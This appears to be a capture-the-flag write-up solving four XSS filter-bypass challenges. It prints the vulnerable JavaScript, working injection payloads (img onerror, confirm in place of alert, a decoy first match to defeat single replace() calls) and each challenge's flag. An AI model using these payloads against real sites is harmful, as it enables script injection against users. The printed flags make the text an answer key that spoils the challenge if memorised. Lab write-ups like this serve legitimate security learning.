# Objective #

Cause a popup that says "Hello"


# Challenge 1 #

> bypass the filter that removes any script tags

JS:

    let inputted = ''
          let question = 0
          document.querySelector('#submit-1').addEventListener("click", function() {
            let chal1El = document.querySelector('#challenge-1')
            inputted = chal1El.value
            question = 1
            document.querySelector('#challenge-1-input').innerHTML = inputted.replace("script", "")
          });


XSS:

Tried \<img src=#> and it returns a small image logo

    <img src=# onerror=alert('Hello')>

Yay, got the flag! 
<details><summary>Flag</summary>
    3c3cf8d90aaece81710ab9db759352c0
</details>



# Challenge 2 #

> word "alert" is filtered

JS:

    document.querySelector('#submit-2').addEventListener("click", async function() {
            let chal2El = document.querySelector('#challenge-2')
            inputted = chal2El.value
            question = 2
            document.querySelector('#challenge-2-input').innerHTML = inputted.replace("alert", "")
            crappyCheck()
          });

XSS:

Well uh... what if we try using an image again?

\<img src=#> returns a small img logo, so it works

    <img src=# onerror="window.confirm('Hello')">

Yay I got the flag!
<details><summary>Flag</summary>
    a2e5ef66f5ff584a01d734ef5edaae91
</details>


# Challenge 3 #

> The word "Hello" is filtered

JS:

    document.querySelector('#submit-3').addEventListener("click", function() {
            let chal3El = document.querySelector('#challenge-3')
            inputted = chal3El.value
            question = 3
            document.querySelector('#challenge-3-input').innerHTML = inputted.replace("Hello", "")
          });


XSS:

I thought of how replace() actually works
Since we are passing it a value

	inputted = chal3El.value //line 3 of JS
	inputted.replace("Hello", "") //line 5 of JS

it only replaces the first instance of the string provided

Example:
> "Hello, Hello" returns ", Hello"

So let's try it

    Hello <img src=# onerror=alert('Hello')>

Success! 
<details><summary>Flag</summary>
    decba45d0eff17c6eedf1629393bee1d
</details>

### Note: ### 

I went back and tried this for challenge 2 as well. The popup with "Hello" would appear, but no flag for some reason :c


# Challenge 4 #

> The following is filtered:
    
    word "Hello"
    script
    onerror
    onsubmit
    onload
    onmouseover
    onfocus
    onmouseout
    onkeypress
    onchange


JS:

    document.querySelector('#submit-4').addEventListener("click", function() {
            let chal4El = document.querySelector('#challenge-4')
            inputted = chal4El.value
            question = 4
            document.querySelector('#challenge-4-input').innerHTML = inputted.replace("Hello", "").replace("script", "").replace("onerror", "").replace("onsubmit", "").replace("onload", "").replace("onmouseover", "")
            .replace("onfocus", "").replace("onmouseout", "").replace("onkeypress", "").replace("onchange", "")
          });

XSS:

    Hello onerror <img src=# onerror=alert('Hello')>

Hooray! Wish I realized the replace() issue sooner
<details><summary>Flag</summary>
    2482d2e8939fc85a9363617782270555
</details>